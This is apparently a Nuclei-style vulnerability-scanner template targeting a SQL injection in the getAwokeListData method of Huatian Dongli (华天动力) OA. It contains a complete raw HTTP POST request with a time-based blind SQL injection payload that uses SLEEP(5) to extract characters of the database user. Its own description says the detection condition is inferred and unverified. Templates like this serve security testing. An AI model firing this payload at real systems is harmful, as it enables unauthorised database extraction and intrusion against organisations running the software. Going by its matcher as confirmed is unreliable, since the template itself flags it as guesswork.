id: poc-kh6yw9ro8t7e0bpt
info:
  name: 华天动力OA getAwokeListData存在SQL注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2025
http:
- raw:
  - 'POST /OAapp/bfapp/buffalo/workFlowService HTTP/1.1

    Host: {{Hostname}}

    Content-Type: text/xml; charset=utf-8

    Accept: */*

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0

    Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3

    Accept-Encoding: gzip, deflate

    Cache-Control: max-age=0

    Connection: close

    Content-Length: 160


    <buffalo-call>

    <method>getAwokeListData</method>

    <string>{"k":"SELECT IF(ASCII(SUBSTRING((SELECT USER()),1,1))=114,SLEEP(5),0)"}</string>

    </buffalo-call>'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
